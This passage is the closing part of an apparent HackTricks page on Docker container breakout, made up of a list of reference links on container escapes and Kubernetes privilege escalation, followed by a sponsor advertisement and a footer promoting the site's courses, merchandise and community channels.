* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
